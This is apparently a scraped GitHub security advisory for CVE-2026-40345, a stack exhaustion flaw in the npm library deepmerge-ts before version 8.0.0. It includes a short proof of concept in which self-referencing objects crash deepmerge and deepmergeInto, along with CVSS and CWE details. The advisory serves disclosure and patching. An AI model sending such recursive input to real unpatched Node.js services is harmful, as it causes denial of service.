@@ -1,0 +1,272 @@
+Source: https://github.com/advisories/GHSA-ggr8-5vv4-36mx
+
+GitHub Advisory Database
+GitHub Reviewed
+CVE-2026-40345
+DeepmergeTS has stack exhaustion when merging recursive object graphs
+High severity
+GitHub Reviewed
+Published
+Aug 16, 2026
+in
+RebeccaStevens/deepmerge-ts
+•
+            Updated
+Aug 17, 2026
+Vulnerability details
+Dependabot alerts
+0
+Package
+npm
+deepmerge-ts
+(
+npm
+)
+Affected versions
+< 8.0.0
+Patched versions
+8.0.0
+Description
+Summary
+deepmerge()
+and
+deepmergeInto()
+can be crashed with a crafted recursive object graph. When both merged values contain self-references at the same property path, the library recurses until Node throws
+RangeError: Maximum call stack size exceeded
+.
+Details
+Record merging is implemented recursively. For each enumerable key, the library collects the values from every input object and immediately calls the same merge routine on that property.
+There is no visited-object tracking, pair tracking, or cycle detection in that recursion. As a result, if two merged records both point back to themselves through the same key path, the merge logic keeps revisiting the same object pair forever.
+This is reachable through the real public API:
+deepmerge(...)
+deepmergeCustom(...)(...)
+deepmergeInto(target, ...)
+deepmergeIntoCustom(...)(target, ...)
+The issue only occurs when recursive object graphs are supplied. Plain JSON alone does not create this condition.
+PoC
+import
+{
+deepmerge
+,
+deepmergeInto
+}
+from
+"deepmerge-ts"
+;
+const
+left
+=
+{
+}
+;
+left
+.
+self
+=
+left
+;
+const
+right
+=
+{
+}
+;
+right
+.
+self
+=
+right
+;
+try
+{
+deepmerge
+(
+left
+,
+right
+)
+;
+}
+catch
+(
+error
+)
+{
+console
+.
+log
+(
+error
+.
+name
+,
+error
+.
+message
+)
+;
+// Expected: the merge should reject or safely handle recursive input without exhausting the stack.
+// Vulnerable behavior: RangeError Maximum call stack size exceeded
+}
+const
+target
+=
+{
+}
+;
+target
+.
+self
+=
+target
+;
+const
+source
+=
+{
+}
+;
+source
+.
+self
+=
+source
+;
+try
+{
+deepmergeInto
+(
+target
+,
+source
+)
+;
+}
+catch
+(
+error
+)
+{
+console
+.
+log
+(
+error
+.
+name
+,
+error
+.
+message
+)
+;
+// Expected: the merge should reject or safely handle recursive input without exhausting the stack.
+// Vulnerable behavior: RangeError Maximum call stack size exceeded
+}
+Impact
+Applications that pass attacker-controlled recursive object graphs into these APIs can be forced into a synchronous crash path. In Node.js services, that can terminate request handling for the affected process or trigger repeated worker restarts until the malicious input is blocked.
+References
+GHSA-ggr8-5vv4-36mx
+https://github.com/RebeccaStevens/deepmerge-ts/releases/tag/v8.0.0
+RebeccaStevens
+published to
+RebeccaStevens/deepmerge-ts
+Aug 16, 2026
+Published to the GitHub Advisory Database
+Aug 17, 2026
+Reviewed
+Aug 17, 2026
+Last updated
+Aug 17, 2026
+Severity
+High
+8.2
+CVSS overall score
+This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).
+/ 10
+CVSS v4 base metrics
+Exploitability Metrics
+Attack Vector
+Network
+Attack Complexity
+Low
+Attack Requirements
+Present
+Privileges Required
+None
+User interaction
+None
+Vulnerable System Impact Metrics
+Confidentiality
+None
+Integrity
+None
+Availability
+High
+Subsequent System Impact Metrics
+Confidentiality
+None
+Integrity
+None
+Availability
+None
+Learn more about base metrics
+CVSS v4 base metrics
+Exploitability Metrics
+Attack Vector:
+This metric reflects the context by which vulnerability exploitation is possible. This metric value (and consequently the resulting severity) will be larger the more remote (logically, and physically) an attacker can be in order to exploit the vulnerable system. The assumption is that the number of potential attackers for a vulnerability that could be exploited from across a network is larger than the number of potential attackers that could exploit a vulnerability requiring physical access to a device, and therefore warrants a greater severity.
+Attack Complexity:
+This metric captures measurable actions that must be taken by the attacker to actively evade or circumvent existing built-in security-enhancing conditions in order to obtain a working exploit. These are conditions whose primary purpose is to increase security and/or increase exploit engineering complexity. A vulnerability exploitable without a target-specific variable has a lower complexity than a vulnerability that would require non-trivial customization. This metric is meant to capture security mechanisms utilized by the vulnerable system.
+Attack Requirements:
+This metric captures the prerequisite deployment and execution conditions or variables of the vulnerable system that enable the attack. These differ from security-enhancing techniques/technologies (ref Attack Complexity) as the primary purpose of these conditions is not to explicitly mitigate attacks, but rather, emerge naturally as a consequence of the deployment and execution of the vulnerable system.
+Privileges Required:
+This metric describes the level of privileges an attacker must possess prior to successfully exploiting the vulnerability. The method by which the attacker obtains privileged credentials prior to the attack (e.g., free trial accounts), is outside the scope of this metric. Generally, self-service provisioned accounts do not constitute a privilege requirement if the attacker can grant themselves privileges as part of the attack.
+User interaction:
+This metric captures the requirement for a human user, other than the attacker, to participate in the successful compromise of the vulnerable system. This metric determines whether the vulnerability can be exploited solely at the will of the attacker, or whether a separate user (or user-initiated process) must participate in some manner.
+Vulnerable System Impact Metrics
+Confidentiality:
+This metric measures the impact to the confidentiality of the information managed by the VULNERABLE SYSTEM due to a successfully exploited vulnerability. Confidentiality refers to limiting information access and disclosure to only authorized users, as well as preventing access by, or disclosure to, unauthorized ones.
+Integrity:
+This metric measures the impact to integrity of a successfully exploited vulnerability. Integrity refers to the trustworthiness and veracity of information. Integrity of the VULNERABLE SYSTEM is impacted when an attacker makes unauthorized modification of system data. Integrity is also impacted when a system user can repudiate critical actions taken in the context of the system (e.g. due to insufficient logging).
+Availability:
+This metric measures the impact to the availability of the VULNERABLE SYSTEM resulting from a successfully exploited vulnerability. While the Confidentiality and Integrity impact metrics apply to the loss of confidentiality or integrity of data (e.g., information, files) used by the system, this metric refers to the loss of availability of the impacted system itself, such as a networked service (e.g., web, database, email). Since availability refers to the accessibility of information resources, attacks that consume network bandwidth, processor cycles, or disk space all impact the availability of a system.
+Subsequent System Impact Metrics
+Confidentiality:
+This metric measures the impact to the confidentiality of the information managed by the SUBSEQUENT SYSTEM due to a successfully exploited vulnerability. Confidentiality refers to limiting information access and disclosure to only authorized users, as well as preventing access by, or disclosure to, unauthorized ones.
+Integrity:
+This metric measures the impact to integrity of a successfully exploited vulnerability. Integrity refers to the trustworthiness and veracity of information. Integrity of the SUBSEQUENT SYSTEM is impacted when an attacker makes unauthorized modification of system data. Integrity is also impacted when a system user can repudiate critical actions taken in the context of the system (e.g. due to insufficient logging).
+Availability:
+This metric measures the impact to the availability of the SUBSEQUENT SYSTEM resulting from a successfully exploited vulnerability. While the Confidentiality and Integrity impact metrics apply to the loss of confidentiality or integrity of data (e.g., information, files) used by the system, this metric refers to the loss of availability of the impacted system itself, such as a networked service (e.g., web, database, email). Since availability refers to the accessibility of information resources, attacks that consume network bandwidth, processor cycles, or disk space all impact the availability of a system.
+CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N
+EPSS score
+0.524%
+Exploit Prediction Scoring System (EPSS)
+This score estimates the probability of this vulnerability being exploited within the next 30 days.
+            Data provided by
+FIRST
+.
+(43rd percentile)
+Weaknesses
+Weakness
+CWE-674
+Uncontrolled Recursion
+The product does not properly control the amount of recursion that takes place, consuming excessive resources, such as allocated memory or the program stack.
+Learn more on MITRE.
+CVE ID
+CVE-2026-40345
+GHSA ID
+GHSA-ggr8-5vv4-36mx
+Source code
+RebeccaStevens/deepmerge-ts
+Credits
+Jvr2022
+Reporter
+Loading
+Checking history
+Uh oh!
+There was an error while loading.
+Please reload this page
+.
+See something to contribute?
+Suggest improvements for this vulnerability
+.
